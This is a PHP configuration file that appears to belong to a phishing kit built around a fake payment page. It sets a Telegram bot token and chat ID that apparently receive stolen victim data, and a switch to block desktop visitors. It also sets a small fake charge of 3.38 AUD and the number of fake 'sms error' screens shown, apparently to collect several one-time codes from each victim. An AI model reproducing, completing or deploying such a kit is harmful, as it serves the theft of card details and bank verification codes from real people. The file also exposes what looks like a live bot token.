<?php 

//Have a telegram bot? put the tokens here :D
$bot = "6166356892:AAEeC_jsQrnrectGDICd5XNUp70iC012KBY";
$chat_ids = array("-623088654");


// to block pc - on | off
$block_pc = "off";


//seconds of waiting
$seconds = 1;


// Amount to show in payment page.
$amount = "3.38 AUD";


// how many times the user will see sms error.
$sms_error_times = 3;


?>